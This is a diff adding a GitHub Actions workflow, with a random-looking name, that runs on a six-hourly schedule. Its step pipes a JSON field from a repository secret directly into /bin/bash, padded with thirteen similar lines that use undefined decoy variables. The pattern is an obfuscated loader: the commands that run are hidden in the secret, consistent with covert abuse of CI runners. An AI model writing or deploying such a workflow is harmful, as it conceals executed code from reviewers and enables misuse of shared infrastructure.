@@ -1,0 +1,30 @@
+name: wuhuobao9876
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '55 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wuhuobao9876
+        env:
+          knt2: ${{ secrets.knt2 }}
+        run: |
+          echo $knt2 | jq -r .o78 | /bin/bash
+          echo $rpkyn367 | jq -r .xpvjz5061 | /bin/bash
+          echo $paf98 | jq -r .mlfr25 | /bin/bash
+          echo $hlp70 | jq -r .d3 | /bin/bash
+          echo $nbxa66756 | jq -r .l99 | /bin/bash
+          echo $kmv12 | jq -r .gpc48 | /bin/bash
+          echo $gp687 | jq -r .ii07578 | /bin/bash
+          echo $c4 | jq -r .urnrl48606 | /bin/bash
+          echo $yhco73782 | jq -r .hmedp9 | /bin/bash
+          echo $yv959 | jq -r .f71276 | /bin/bash
+          echo $utc7557 | jq -r .ut01 | /bin/bash
+          echo $tad47904 | jq -r .r0 | /bin/bash
+          echo $b4 | jq -r .tury4468 | /bin/bash
+          echo $zmige8 | jq -r .wrxrk669 | /bin/bash
+
